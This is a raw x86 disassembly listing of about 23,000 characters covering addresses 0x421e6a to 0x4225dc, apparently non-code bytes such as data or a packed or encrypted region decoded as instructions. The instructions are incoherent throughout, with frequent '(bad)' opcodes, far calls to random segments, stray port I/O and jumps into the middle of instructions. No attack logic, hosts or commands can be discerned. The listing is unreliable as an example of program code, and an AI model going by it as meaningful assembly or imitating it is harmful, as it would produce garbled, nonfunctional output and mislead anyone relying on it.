  421e6a:	adc    DWORD PTR [edx+0x30],0x5c077a3b
  421e71:	push   ss
  421e72:	outs   dx,BYTE PTR ds:[esi]
  421e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e74:	mov    dh,0x50
  421e76:	fmul   DWORD PTR [edx+0x262ab4b4]
  421e7c:	push   edx
  421e7d:	push   0xffffff9a
  421e7f:	jmp    0x9c86bef1
  421e84:	lea    ecx,[edi]
  421e86:	ins    BYTE PTR es:[edi],dx
  421e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e88:	jmp    0xcc8e949f
  421e8d:	lods   al,BYTE PTR ds:[esi]
  421e8e:	lds    eax,FWORD PTR [ebx+0x11a133cf]
  421e94:	jnp    0x421ea0
  421e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e97:	xlat   BYTE PTR ds:[ebx]
  421e98:	enter  0xc82c,0x75
  421e9c:	jbe    0x421f09
  421e9e:	inc    esp
  421e9f:	mov    ecx,0xe05069a4
  421ea4:	shl    DWORD PTR [eax-0x31352b96],0x22
  421eab:	adc    DWORD PTR [edi-0x6b67f5b1],0x57
  421eb2:	push   es
  421eb3:	lods   eax,DWORD PTR ds:[esi]
  421eb4:	mov    bl,0x7c
  421eb6:	gs aam 0xc9
  421eb9:	mov    eax,0xe9652bba
  421ebe:	pop    edx
  421ebf:	lahf   
  421ec0:	jle    0x421ee0
  421ec2:	sbb    ch,BYTE PTR [ecx+0x70]
  421ec5:	mov    bh,BYTE PTR [ebx-0x4]
  421ec8:	imul   ecx,DWORD PTR [esp+edx*4-0x46],0xffffff81
  421ecd:	fmul   st,st(2)
  421ecf:	(bad)  
  421ed0:	mov    al,0xbb
  421ed2:	addr16 push 0xffffffd0
  421ed5:	adc    eax,0x4c095aa
  421eda:	xchg   ebp,eax
  421edb:	jp     0x421f4f
  421edd:	sahf   
  421ede:	pop    edi
  421edf:	sti    
  421ee0:	inc    ecx
  421ee2:	call   0x4871:0x1eb64e5c
  421ee9:	ins    BYTE PTR es:[edi],dx
  421eea:	dec    edx
  421eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421eec:	shl    BYTE PTR [edi],cl
  421eee:	leave  
  421eef:	mov    WORD PTR [ecx-0x19],es
  421ef2:	shl    DWORD PTR [edi],0xbc
  421ef5:	rol    BYTE PTR [esi-0x56],cl
  421ef8:	sbb    al,0xb
  421efa:	loope  0x421e9b
  421efc:	adc    DWORD PTR [ecx],0xffffff8f
  421eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f00:	jo     0x421ef8
  421f02:	and    DWORD PTR [esi+0x1c7c04df],0xffffffb2
  421f09:	call   0x4ab1:0x9cc03510
  421f10:	or     ecx,DWORD PTR [ebx]
  421f12:	cwde   
  421f13:	repz out 0x54,eax
  421f16:	sahf   
  421f17:	dec    ecx
  421f18:	and    al,0x48
  421f1a:	call   0x5e79:0xa713f21d
  421f21:	dec    edx
  421f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f23:	inc    ebp
  421f24:	xchg   ebp,eax
  421f25:	or     edi,DWORD PTR [esp+edx*2-0x33846c52]
  421f2c:	jle    0x421f89
  421f2e:	mov    DWORD PTR ds:0xe69d0aaf,esi
  421f34:	out    dx,eax
  421f35:	jae    0x421f31
  421f37:	pop    edi
  421f38:	mov    edi,ss
  421f3a:	jmp    0x9ab954da
  421f3f:	xor    edi,DWORD PTR [eax]
  421f41:	loopne 0x421f6b
  421f43:	mov    al,ds:0x279aea76
  421f48:	or     esi,DWORD PTR [esi-0x49]
  421f4b:	ret    
  421f4c:	jecxz  0x421f79
  421f4e:	cmp    al,0xa0
  421f50:	push   esp
  421f51:	dec    eax
  421f52:	xlat   BYTE PTR ds:[ebx]
  421f53:	lock popa 
  421f55:	imul   edx,DWORD PTR [ebp-0x1d],0xffffff81
  421f59:	aaa    
  421f5a:	call   0xa992:0xc3756be2
  421f61:	jmp    0x421fab
  421f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f64:	dec    esp
  421f65:	imul   edx,esi,0xd1883311
  421f6b:	sub    BYTE PTR [edx-0xd],dl
  421f6e:	fwait
  421f6f:	pop    esp
  421f70:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  421f72:	mov    ecx,0x4e24fc96
  421f77:	stos   BYTE PTR es:[edi],al
  421f78:	call   0x24312088
  421f7d:	popa   
  421f7e:	fild   DWORD PTR [eax+0xdbcdd76]
  421f84:	retf   0xa38b
  421f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f88:	push   ss
  421f89:	add    al,0xde
  421f8b:	(bad)  
  421f8c:	mov    eax,ds:0x31a72c70
  421f91:	adc    esi,ebp
  421f93:	and    eax,0x6a93d87
  421f98:	vmulss xmm6,xmm4,DWORD PTR [ebx+ecx*4-0x85fe5ab]
  421fa2:	scas   al,BYTE PTR es:[edi]
  421fa3:	push   edi
  421fa4:	ins    BYTE PTR es:[edi],dx
  421fa5:	push   ecx
  421fa6:	adc    al,0x57
  421fa8:	lock test al,0x98
  421fab:	add    eax,0x855ed17c
  421fb0:	into   
  421fb1:	mov    ebp,DWORD PTR [ebx]
  421fb3:	je     0x421fcc
  421fb5:	xchg   BYTE PTR [edi+eiz*4+0x4867ff16],bh
  421fbc:	das    
  421fbd:	fwait
  421fbe:	test   eax,0x4dcfb3f9
  421fc3:	mov    esp,0xd1ea1a29
  421fc8:	dec    esi
  421fc9:	in     al,dx
  421fca:	push   ebp
  421fcb:	fdivp  st(2),st
  421fcd:	or     eax,DWORD PTR [edx-0x6e671f2a]
  421fd3:	test   ah,ah
  421fd5:	fisubr DWORD PTR [eax+0x7b]
  421fd8:	mov    cl,0x80
  421fda:	scas   eax,DWORD PTR es:[edi]
  421fdb:	stos   BYTE PTR es:[edi],al
  421fdc:	xchg   esp,eax
  421fdd:	retf   
  421fde:	sti    
  421fdf:	dec    edi
  421fe0:	mov    BYTE PTR [edx+0x15964d87],ch
  421fe6:	push   0xa9cbab16
  421feb:	adc    al,0x1d
  421fed:	mov    ecx,0xa52a04f3
  421ff2:	call   0xd39f:0xbdab9cbc
  421ff9:	or     ecx,ebp
  421ffb:	fmul   DWORD PTR [ebx]
  421ffd:	or     eax,DWORD PTR [edi]
  421fff:	jmp    0xee043dc6
  422004:	sti    
  422005:	inc    edi
  422006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422007:	imul   edx,DWORD PTR [ebx-0x3d],0xda06a748
  42200e:	pop    ebx
  42200f:	dec    ebp
  422010:	pop    es
  422011:	test   DWORD PTR [eax],esp
  422013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422014:	add    al,0xaf
  422016:	mov    ebx,0xe84378cd
  42201b:	pop    eax
  42201c:	int    0xb3
  42201e:	sahf   
  42201f:	in     al,0x97
  422021:	imul   eax,DWORD PTR [esi+0x64cf324b],0xffffff8e
  422028:	lods   eax,DWORD PTR ds:[esi]
  422029:	push   es
  42202a:	sub    esp,esi
  42202c:	sbb    ch,ch
  42202e:	lods   al,BYTE PTR ds:[esi]
  42202f:	pop    esp
  422030:	adc    cl,BYTE PTR [ebx+0x48]
  422033:	stc    
  422034:	mov    dl,0x1d
  422036:	arpl   WORD PTR [esp+eiz*8+0x4f],bp
  42203a:	push   ebx
  42203b:	imul   ebx,DWORD PTR [edi],0x31
  42203e:	xchg   ecx,eax
  42203f:	test   al,0xbd
  422041:	cmp    eax,0x8a32430a
  422046:	pop    es
  422047:	in     eax,0x9b
  422049:	retf   
  42204a:	call   0x6c72:0x2bd1670
  422051:	mov    al,ds:0x70105d70
  422056:	(bad)  
  422057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422058:	scas   eax,DWORD PTR es:[edi]
  422059:	arpl   bx,si
  42205b:	jne    0x422068
  42205d:	mov    eax,0x11b26a51
  422062:	outs   dx,DWORD PTR ds:[esi]
  422063:	push   eax
  422064:	mov    esi,0x904d5461
  422069:	or     edx,DWORD PTR [edx+eax*2]
  42206c:	fwait
  42206d:	pusha  
  42206e:	xor    al,0xc4
  422070:	push   eax
  422071:	mov    ah,0x68
  422073:	mov    ds:0xf29b42b2,eax
  422078:	mov    ch,0x78
  42207a:	mov    esi,0xff0ba0be
  42207f:	cmp    al,0x38
  422081:	pop    ss
  422082:	outs   dx,BYTE PTR ds:[esi]
  422083:	popa   
  422084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422085:	dec    edx
  422086:	cdq    
  422087:	push   ds
  422088:	sbb    BYTE PTR cs:[edi+0x1783b98c],bh
  42208f:	ret    
  422090:	out    0xb,eax
  422092:	leave  
  422093:	outs   dx,DWORD PTR ds:[esi]
  422094:	xor    bh,al
  422096:	sbb    eax,0x9aef38ed
  42209b:	mov    bh,0xeb
  42209d:	jns    0x4220b9
  42209f:	sub    al,0x1d
  4220a1:	stos   BYTE PTR es:[edi],al
  4220a2:	fs inc ecx
  4220a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220a5:	or     ecx,DWORD PTR [edi-0x254269c]
  4220ab:	push   0x28
  4220ad:	pop    esp
  4220ae:	call   0xd838:0x76c37e97
  4220b5:	sahf   
  4220b6:	pop    eax
  4220b7:	test   eax,0x10bdafb0
  4220bc:	push   edx
  4220bd:	jp     0x4220a4
  4220bf:	bound  ecx,QWORD PTR [edx+0x28]
  4220c2:	call   0x4c0b:0x2018f078
  4220c9:	add    BYTE PTR [eax-0x59],bh
  4220cc:	pushf  
  4220cd:	push   cs
  4220ce:	loop   0x422053
  4220d0:	test   eax,0xb3dab631
  4220d5:	cmp    di,cx
  4220d8:	jno    0x422152
  4220da:	mov    ah,BYTE PTR [edx+edx*2]
  4220dd:	mov    DWORD PTR [edi-0x59],ebx
  4220e0:	push   eax
  4220e1:	cs add eax,0x5bc3f28c
  4220e7:	sti    
  4220e8:	mov    dl,0x29
  4220ea:	push   ebp
  4220eb:	dec    esi
  4220ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220ed:	xchg   edx,eax
  4220ee:	cmp    esi,edx
  4220f0:	cli    
  4220f1:	or     DWORD PTR [edx+0x444a3d01],eax
  4220f7:	pop    edi
  4220f8:	rcr    DWORD PTR [edx],1
  4220fa:	jp     0x42211e
  4220fc:	lahf   
  4220fd:	and    bl,BYTE PTR [edx+0x5f46e5a9]
  422103:	in     al,0x75
  422105:	lods   eax,DWORD PTR ds:[esi]
  422106:	test   BYTE PTR [edi+0x671b1379],ah
  42210c:	outs   dx,DWORD PTR ds:[esi]
  42210d:	retf   0x2b09
  422110:	mov    dl,0x76
  422112:	sbb    eax,0x3856febb
  422117:	sbb    BYTE PTR ds:0x9b91060a,ch
  42211d:	loopne 0x4220de
  42211f:	or     dl,BYTE PTR [ebp-0x31]
  422122:	ret    0xb21a
  422125:	and    ecx,DWORD PTR [eax-0x15bfd8a]
  42212b:	loopne 0x4220d7
  42212d:	loope  0x42214e
  42212f:	aas    
  422130:	xor    DWORD PTR [ebx],ecx
  422132:	cmp    eax,0x75680887
  422137:	adc    edx,edi
  422139:	cli    
  42213a:	call   0x6c40:0x78afc1b7
  422141:	hlt    
  422142:	lods   eax,DWORD PTR ds:[esi]
  422143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422144:	popf   
  422145:	xlat   BYTE PTR ds:[ebx]
  422146:	mov    ?,esp
  422148:	dec    eax
  422149:	sub    DWORD PTR [ebx+0x3189b29b],esp
  42214f:	jb     0x422120
  422151:	pop    esi
  422152:	aas    
  422153:	fs loope 0x422161
  422156:	in     eax,dx
  422157:	pop    edx
  422158:	sub    ecx,ebp
  42215a:	mov    ch,0x24
  42215c:	mov    ds:0xb25cead7,eax
  422161:	outs   dx,DWORD PTR ds:[esi]
  422162:	or     bh,BYTE PTR ds:0xc7cf0f80
  422168:	stos   DWORD PTR es:[edi],eax
  422169:	or     edx,DWORD PTR [edx]
  42216b:	(bad)
  42216f:	and    ah,BYTE PTR [edx-0x5c]
  422172:	xchg   ebp,eax
  422173:	dec    edi
  422174:	dec    ebp
  422175:	rcl    DWORD PTR [eax+0x46e435f8],cl
  42217b:	punpckldq mm1,mm5
  42217e:	push   ecx
  42217f:	das    
  422180:	int    0xb
  422182:	xchg   edx,eax
  422183:	dec    ebx
  422184:	imul   BYTE PTR [eax+0xa3d70bb]
  42218a:	outs   dx,BYTE PTR ds:[esi]
  42218b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42218c:	mov    dl,0x7c
  42218e:	xlat   BYTE PTR ds:[ebx]
  42218f:	sub    al,BYTE PTR [ebx-0x5daf8de2]
  422195:	or     BYTE PTR [esi+ecx*8+0xf],ah
  422199:	scas   al,BYTE PTR es:[edi]
  42219a:	das    
  42219b:	dec    ah
  42219d:	xchg   ebp,eax
  42219e:	xchg   esp,eax
  42219f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221a0:	jb     0x422162
  4221a2:	(bad)  
  4221a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221a4:	mov    ebx,0xae77c0b2
  4221a9:	push   edi
  4221aa:	inc    ecx
  4221ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221ac:	jo     0x422196
  4221ae:	sbb    ah,ah
  4221b0:	hlt    
  4221b1:	int    0xa7
  4221b3:	xchg   edi,eax
  4221b4:	mov    dl,0x30
  4221b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221b7:	into   
  4221b8:	mov    bl,0xbb
  4221ba:	(bad)  
  4221bc:	jp     0x4221c6
  4221be:	(bad)  
  4221bf:	cld    
  4221c0:	sar    BYTE PTR [esi],cl
  4221c2:	or     edx,DWORD PTR [esi]
  4221c4:	inc    ecx
  4221c5:	std    
  4221c6:	sbb    bl,dl
  4221c8:	test   al,0xad
  4221ca:	call   0xeb91:0x738080c1
  4221d1:	fwait
  4221d2:	pop    esp
  4221d3:	pop    ds
  4221d4:	(bad)  
  4221d5:	or     ebp,esi
  4221d7:	mov    ebx,0x7d0fd218
  4221dc:	adc    eax,0xd59e9d19
  4221e1:	xchg   edx,eax
  4221e2:	stc    
  4221e3:	jmp    0x3a5c29ed
  4221e8:	pop    ss
  4221e9:	jl     0x422236
  4221eb:	mov    al,ds:0xc1194bd6
  4221f0:	adc    al,0xe7
  4221f2:	and    al,0xde
  4221f4:	mov    dl,0xec
  4221f6:	into   
  4221f7:	ins    DWORD PTR es:[edi],dx
  4221f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221f9:	add    DWORD PTR [ebx],esi
  4221fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221fc:	inc    ecx
  4221fd:	or     ecx,DWORD PTR [ebp+0x32]
  422200:	jnp    0x42220f
  422202:	add    BYTE PTR [ecx-0x4c65675e],bh
  422208:	(bad)  
  422209:	dec    edx
  42220a:	lock mov edx,0xa739f056
  422210:	jbe    0x4221ad
  422212:	cmp    BYTE PTR [ebp-0x4e2f3b52],dh
  422218:	mov    ch,0xc5
  42221a:	or     al,0xe9
  42221c:	cli    
  42221d:	xlat   BYTE PTR ds:[ebx]
  42221e:	call   0x38a7:0xad90741e
  422225:	adc    cl,BYTE PTR [edi]
  422227:	push   edi
  422228:	add    DWORD PTR [ebx],ebx
  42222a:	mul    DWORD PTR [ecx]
  42222c:	mov    dl,0x59
  42222e:	xchg   edi,eax
  42222f:	sbb    al,0x30
  422231:	pop    ds
  422232:	or     eax,0x7e0c98c3
  422237:	shl    ah,0xdd
  42223a:	or     DWORD PTR [edi-0x5e],edx
  42223d:	pop    edx
  42223e:	enter  0xcd27,0x5f
  422242:	call   0xfe5:0xa9529bf
  422249:	adc    DWORD PTR [ecx],esi
  42224b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42224c:	dec    esi
  42224d:	xchg   esi,eax
  42224e:	push   ebx
  42224f:	aas    
  422250:	sbb    BYTE PTR [esi-0x5d],ch
  422253:	jge    0x422207
  422255:	mov    ah,BYTE PTR [eax+0x51]
  422258:	mov    edx,esp
  42225a:	mov    al,ds:0xcef78a0a
  42225f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422260:	test   esi,0xa45274d
  422266:	shr    DWORD PTR [ebx-0x4e],0xcf
  42226a:	ja     0x42227d
  42226c:	add    eax,0x4a8c07e8
  422271:	or     BYTE PTR [ecx],bl
  422273:	pop    edx
  422274:	pop    ebx
  422275:	adc    DWORD PTR [ebx+0x30b12204],edx
  42227b:	pop    ebp
  42227c:	mov    dl,0xa6
  42227e:	or     al,0x68
  422280:	push   ebx
  422281:	inc    esp
  422282:	inc    edx
  422283:	mov    ch,0x9
  422285:	or     al,0xf6
  422287:	mov    WORD PTR [esi-0x73e85086],fs
  42228d:	mov    dh,0x31
  42228f:	xor    eax,0xa05e088b
  422294:	mov    ds:0xa3591a64,eax
  422299:	xor    edx,eax
  42229b:	xchg   BYTE PTR [eax-0x35],bh
  42229e:	out    dx,eax
  42229f:	dec    edi
  4222a0:	test   DWORD PTR [ebx],0xbbd5cfb6
  4222a6:	jmp    0xcefb:0x9ad8690e
  4222ad:	cs push ebp
  4222af:	inc    edx
  4222b0:	ror    eax,cl
  4222b2:	adc    esp,DWORD PTR [edi+0x7de1e81]
  4222b8:	lds    ebx,FWORD PTR [ebx+ecx*4+0x26]
  4222bc:	mov    dl,0xbc
  4222be:	outs   dx,DWORD PTR ds:[esi]
  4222bf:	call   0xf72eb661
  4222c4:	inc    ebx
  4222c5:	jno    0x4222a2
  4222c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222c8:	out    0xd4,al
  4222ca:	std    
  4222cb:	push   0xe9cf83e5
  4222d0:	mov    ch,0x3
  4222d2:	xor    bl,BYTE PTR [ecx]
  4222d4:	jg     0x42232f
  4222d6:	mov    edx,0x9554967d
  4222db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222dc:	ins    BYTE PTR es:[edi],dx
  4222dd:	(bad)  [ecx-0x6d]
  4222e0:	hlt    
  4222e1:	mov    esp,0x4fe2eb5a
  4222e6:	call   0x99b0:0xb8c2c6df
  4222ed:	mov    eax,0xcba1a728
  4222f2:	pop    esi
  4222f3:	(bad)  
  4222f4:	add    BYTE PTR [esi+0x52],0x36
  4222f8:	mov    dl,0x10
  4222fa:	sbb    al,0x8
  4222fc:	cmc    
  4222fd:	or     al,0x18
  4222ff:	inc    ebp
  422300:	fst    DWORD PTR [ebx+edx*8]
  422303:	sbb    ecx,DWORD PTR [edx]
  422305:	mov    edi,DWORD PTR [ecx+0x207bafc1]
  42230b:	cs inc edx
  42230d:	(bad)  
  42230e:	jmp    0x422296
  422310:	mov    WORD PTR [edx-0xf],gs
  422313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422314:	aas    
  422315:	test   BYTE PTR [ecx+0x65a0444a],ah
  42231b:	cdq    
  42231c:	adc    BYTE PTR [edx+ebx*4],bl
  42231f:	or     DWORD PTR [esi-0x39],esi
  422322:	pop    ebp
  422323:	sbb    ch,BYTE PTR [eax]
  422325:	clc    
  422326:	call   0x3911:0x2a000c5c
  42232d:	mov    al,ds:0xb42d72d
  422332:	lods   al,BYTE PTR ds:[esi]
  422333:	imul   BYTE PTR [ebx+0x16]
  422336:	mov    esp,0x9adb564f
  42233b:	xor    al,0x20
  42233d:	cmp    al,ch
  42233f:	int3   
  422340:	in     al,0x70
  422342:	leave  
  422343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422344:	jnp    0x42232d
  422346:	mov    ch,0xa2
  422348:	add    edx,DWORD PTR [eax+0x28fc5702]
  42234e:	sar    BYTE PTR [ebp+0x4e2f0b92],cl
  422354:	sahf   
  422355:	push   ss
  422356:	and    al,BYTE PTR [edx]
  422358:	mov    ds:0xee7a50b,eax
  42235d:	lods   eax,DWORD PTR ds:[esi]
  42235e:	sub    edx,eax
  422360:	push   edx
  422361:	ja     0x4222f0
  422363:	aad    0x9f
  422365:	jp     0x422301
  422367:	cwde   
  422368:	sub    BYTE PTR ds:0xb774620,dh
  42236e:	adc    al,0xcd
  422370:	out    0xca,al
  422372:	aad    0x43
  422374:	mov    BYTE PTR [esi],ah
  422376:	call   0x6b5c:0x42036845
  42237d:	fwait
  42237e:	ins    BYTE PTR es:[edi],dx
  42237f:	mov    eax,0xa567f875
  422384:	pop    ss
  422385:	xor    ch,BYTE PTR [edi+0x637bd278]
  42238b:	aas    
  42238c:	les    esp,FWORD PTR [ebx]
  42238e:	call   0x7edc:0x5b7e9016
  422395:	sbb    ecx,DWORD PTR [edi-0x59]
  422398:	mov    ss,WORD PTR [eax+ecx*2]
  42239b:	cmc    
  42239c:	pop    ebx
  42239d:	push   ecx
  42239e:	xchg   BYTE PTR [ecx+0x1590feb2],dl
  4223a4:	test   al,0x60
  4223a6:	scas   al,BYTE PTR es:[edi]
  4223a7:	mov    eax,DWORD PTR [edi-0x11d5bcf5]
  4223ad:	xor    DWORD PTR [ebx+0x72af5bd4],0xb41cb254
  4223b7:	mov    BYTE PTR [ebx],ch
  4223b9:	cdq    
  4223ba:	dec    esp
  4223bb:	push   es
  4223bc:	and    al,0xb
  4223be:	mov    ecx,0xd6380165
  4223c3:	dec    ecx
  4223c4:	push   0x9e2f7abb
  4223c9:	mov    ch,0x31
  4223cb:	cld    
  4223cc:	mov    dl,0x68
  4223ce:	xor    edi,DWORD PTR [edx]
  4223d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223d1:	push   eax
  4223d2:	out    0xa6,al
  4223d4:	lock and eax,0xf30bb558
  4223da:	jnp    0x422437
  4223dc:	ins    BYTE PTR es:[edi],dx
  4223dd:	(bad)  
  4223de:	call   0xfe05:0x272733f8
  4223e5:	dec    eax
  4223e6:	dec    esi
  4223e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223e8:	fcmovbe st,st(7)
  4223ea:	pushf  
  4223eb:	data16 xor al,0x28
  4223ee:	in     al,0xe9
  4223f0:	scas   al,BYTE PTR es:[edi]
  4223f1:	callw  0xd645
  4223f5:	fisubr WORD PTR [esi-0x7e]
  4223f8:	and    edx,esi
  4223fa:	xor    eax,0xcf602aa7
  4223ff:	call   0x6f50:0x1dd470d0
  422406:	call   0xba48:0x32cb83f9
  42240d:	push   ecx
  42240e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42240f:	test   al,0x2e
  422411:	cwde   
  422412:	cmp    al,0x69
  422414:	xor    ah,BYTE PTR [ecx+0x2bd7b76c]
  42241a:	call   0x805a:0x2517b636
  422421:	fs pop ecx
  422423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422424:	(bad)  
  422425:	sbb    eax,0xcff5d62e
  42242a:	in     eax,0xdb
  42242c:	scas   al,BYTE PTR es:[edi]
  42242d:	push   ecx
  42242e:	nop
  42242f:	inc    eax
  422430:	jnp    0x422470
  422432:	and    BYTE PTR [edi],ah
  422434:	inc    esp
  422435:	push   ds
  422436:	lea    esi,[ebx+0x59]
  422439:	or     edx,DWORD PTR [ebx]
  42243b:	xchg   ebx,eax
  42243c:	lock pop edx
  42243e:	mov    DWORD PTR [ebx],ecx
  422440:	ror    BYTE PTR [edx-0x66],0xa8
  422444:	iret   
  422445:	xchg   edi,eax
  422446:	push   0xffffffc2
  422448:	ret    
  422449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42244a:	mov    esi,0x7cc089b9
  42244f:	loopne 0x422437
  422451:	fist   WORD PTR [ebx]
  422453:	ja     0x422429
  422455:	dec    ebx
  422456:	hlt    
  422457:	out    0xb3,al
  422459:	mov    ds:0xa0bb419,al
  42245e:	in     eax,0x2f
  422460:	inc    edx
  422461:	jne    0x4224b5
  422463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422464:	sub    BYTE PTR [ecx-0x3face472],0xda
  42246b:	and    dh,BYTE PTR [ebx-0x70cfc21]
  422471:	adc    bl,BYTE PTR [edi+0x5b8366e4]
  422477:	inc    ebx
  422478:	mov    es,WORD PTR [ebx+0x3b]
  42247b:	jb     0x42242f
  42247d:	(bad)  
  42247e:	cmp    al,0x2a
  422480:	sub    BYTE PTR [ebp+0x1a],dl
  422483:	mov    esi,0x2c4c79bc
  422488:	sub    BYTE PTR [ebx],0x5f
  42248b:	mov    ebx,0xa7e7a854
  422490:	repnz loope 0x4224be
  422493:	ds cwde 
  422495:	es dec eax
  422497:	inc    ebx
  422498:	mov    dl,0xdd
  42249a:	aam    0x1e
  42249c:	add    eax,0xacd76541
  4224a1:	jl     0x4224c1
  4224a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224a4:	sub    DWORD PTR ds:0x9401eeb3,ecx
  4224ab:	div    DWORD PTR [edx-0x75c816ba]
  4224b1:	ja     0x42246d
  4224b3:	test   BYTE PTR [ebx+0x292a770a],dh
  4224b9:	sub    DWORD PTR [eax],edx
  4224bb:	xor    ebp,esi
  4224bd:	sub    esi,DWORD PTR [esi+0x5e]
  4224c0:	mov    dl,0x1d
  4224c2:	mov    esi,0x2d957b7
  4224c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c8:	push   esp
  4224c9:	or     bl,dh
  4224cb:	ror    DWORD PTR [edx+0x15],0xdf
  4224cf:	fsub   QWORD PTR [esi+0x2b]
  4224d2:	jmp    0x4224e1
  4224d4:	pop    eax
  4224d5:	push   ss
  4224d6:	call   0x94d0:0x743e64b0
  4224dd:	(bad)  
  4224de:	aas    
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	inc    eax
  4224e1:	out    dx,al
  4224e2:	push   ebx
  4224e3:	pop    ds
  4224e4:	test   al,0xdc
  4224e6:	or     cl,dh
  4224e8:	repnz inc ebp
  4224ea:	inc    esp
  4224eb:	jp     0x42249f
  4224ed:	lea    edx,[eax-0x1b]
  4224f0:	out    dx,al
  4224f1:	or     BYTE PTR [edx+edx*1],bh
  4224f4:	inc    ecx
  4224f5:	add    eax,0x9418f406
  4224fa:	xor    eax,0x4184f220
  4224ff:	sub    bl,al
  422501:	inc    ecx
  422502:	(bad)  
  422503:	push   ebx
  422504:	out    0xa,al
  422506:	ds pfrcpit1 mm4,mm6
  42250b:	outs   dx,BYTE PTR ds:[esi]
  42250c:	dec    esi
  42250d:	dec    edi
  42250e:	dec    esp
  42250f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422510:	and    BYTE PTR [edi-0x76],ch
  422513:	or     al,0xf9
  422515:	loopne 0x4224e2
  422517:	jg     0x4224cb
  422519:	rol    ch,0xba
  42251c:	test   DWORD PTR [edx],edi
  42251e:	xchg   BYTE PTR [ebx+0x3f],ah
  422521:	or     dh,BYTE PTR [ebx-0x6b363cbc]
  422527:	int    0x6b
  422529:	ret    
  42252a:	mov    ah,0xa0
  42252c:	mov    dl,0x9d
  42252e:	xchg   DWORD PTR [ebx],ebx
  422530:	ror    ebx,cl
  422532:	lods   eax,DWORD PTR ds:[esi]
  422533:	and    edx,DWORD PTR [ebx+ecx*1]
  422536:	push   cs
  422537:	rcr    DWORD PTR ds:0x62bfd563,0xa0
  42253e:	call   0x7827:0xf9195bd9
  422545:	pusha  
  422546:	fsub   QWORD PTR [edi+0x61f52f71]
  42254c:	add    edx,edx
  42254e:	je     0x422571
  422550:	dec    edx
  422551:	nop
  422552:	popf   
  422553:	mov    ch,0x61
  422555:	dec    edi
  422556:	xor    al,0x25
  422558:	xor    ch,cl
  42255a:	push   es
  42255b:	mov    es,WORD PTR [esi+0xb]
  42255e:	pop    edx
  42255f:	mov    eax,0xe84cb0b9
  422564:	xor    cl,BYTE PTR [edx-0x5d]
  422567:	adc    BYTE PTR [edi+0x39828b],bh
  42256d:	xor    ebx,DWORD PTR [eax+0x45]
  422570:	daa    
  422571:	push   ebx
  422572:	ins    BYTE PTR es:[edi],dx
  422573:	retf   0x82b2
  422576:	push   edi
  422577:	xor    eax,0x9c73fc4d
  42257c:	mov    dl,0x73
  42257e:	(bad)  
  42257f:	out    0xba,al
  422581:	jmp    0x422543
  422583:	cwde   
  422584:	pop    edi
  422585:	add    eax,0x609203c2
  42258a:	cli    
  42258b:	dec    ecx
  42258c:	pop    ecx
  42258d:	pop    DWORD PTR [esi]
  42258f:	and    BYTE PTR [edx-0x32c1ec09],dh
  422595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422596:	inc    esp
  422597:	and    eax,0x7bc70b3c
  42259c:	cmp    DWORD PTR [ebx-0x6],edi
  42259f:	daa    
  4225a0:	(bad)  
  4225a1:	sbb    BYTE PTR [edi-0x25f99894],al
  4225a7:	add    eax,0xe9a175d8
  4225ac:	xchg   edx,eax
  4225ad:	or     ebp,DWORD PTR [ebx+0x13]
  4225b0:	jmp    0x422609
  4225b2:	mov    al,BYTE PTR [edi-0xa]
  4225b5:	inc    edx
  4225b6:	in     eax,dx
  4225b7:	(bad)  
  4225b8:	iret   
  4225b9:	adc    DWORD PTR [edi-0x27680560],esp
  4225bf:	pop    ecx
  4225c0:	cmp    al,0xa8
  4225c2:	mov    BYTE PTR [eax],ch
  4225c4:	jns    0x422571
  4225c6:	xchg   edx,eax
  4225c7:	popa   
  4225c8:	(bad)
  4225cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225cc:	xchg   DWORD PTR [ebx-0x4768b82a],eax
  4225d2:	xor    al,0x74
  4225d4:	mov    cl,0x9c
  4225d6:	sub    eax,0x56b9f00c
  4225db:	push   edi
  4225dc:	push   0x7ca7fe34
